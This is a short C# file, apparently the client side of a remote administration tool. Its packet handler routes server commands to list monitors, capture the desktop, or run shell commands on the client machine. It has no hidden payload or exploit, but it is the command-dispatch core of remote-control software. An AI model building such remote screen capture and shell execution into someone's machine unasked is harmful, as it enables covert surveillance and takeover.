using Client.Controllers;
using Client.Packets.ServerPackets;

namespace Client.Packets
{
    public static class PacketHandler
    {
        public static void packetChecker(ClientMosaic client, IPackets packet)
        {
            var type = packet.Type;

            if (type == TypePackets.GetMonitors)
            {
                RemoteDesktopController.getMonitors(client);
            }
            else if(type == TypePackets.GetDesktop)
            {
                RemoteDesktopController.getDesktop(client);
            }
            else if (type == TypePackets.GetExecuteShellCmd)
            {
                RemoteShellController.getExecuteShellCmd((GetExecuteShellCmd)packet, client);
            }
        }
    }
}
